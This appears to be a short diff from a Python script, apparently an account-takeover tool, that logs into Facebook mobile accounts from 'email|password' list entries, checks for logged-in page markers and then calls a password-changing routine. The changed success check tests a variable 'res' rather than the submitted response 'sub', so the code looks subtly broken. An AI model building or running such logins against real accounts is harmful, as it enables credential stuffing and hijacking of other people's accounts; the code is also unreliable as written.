@@ -43,7 +43,7 @@ class Ubahpw:
 			br.form['email']=ids.split('|')[0]
 			br.form['pass']=ids.split('|')[1]
 			sub=br.submit().read()
-			if 'save-device' in str(sub) or 'm_sess' in str(sub):
+			if 'logout.php' in str(res) or 'mbasic_logout_button' in str(res):
 				self.ganti(ids)
 			else:
 				print(f'[\033[91mFailed\033[0m] {ids}')
